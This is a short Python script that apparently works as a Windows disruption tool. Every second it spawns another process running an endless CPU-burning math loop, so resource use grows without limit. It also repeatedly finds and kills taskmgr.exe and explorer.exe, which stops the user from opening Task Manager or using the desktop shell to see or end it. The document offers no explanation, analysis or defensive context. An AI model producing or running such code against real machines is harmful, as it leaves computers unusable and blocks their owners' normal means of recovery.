import math
import psutil
import time
from multiprocessing import Process

def cpu_Killer():
    x = 0.1
    while True:
        x = math.sin(x) * math.cos(x) + math.cos(x) * math.sin(x) + math.sqrt(x + 1)

def is_running(process_name):
    for proc in psutil.process_iter(['name']):
        name = proc.info['name']
        if name and name.lower() == process_name.lower():
            return True
    return False

def kill_process(process_name):
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
            proc.kill()

if __name__ == "__main__":
    while True:
        p = Process(target=cpu_Killer)
        p.start()

        status1 = is_running("taskmgr.exe")
        status2 = is_running("explorer.exe")
        print("Status1",status1,"\nStatus2", status2)

        if status1 == True or status2 == True:
            kill_process("taskmgr.exe")
            kill_process("explorer.exe")
        time.sleep(1)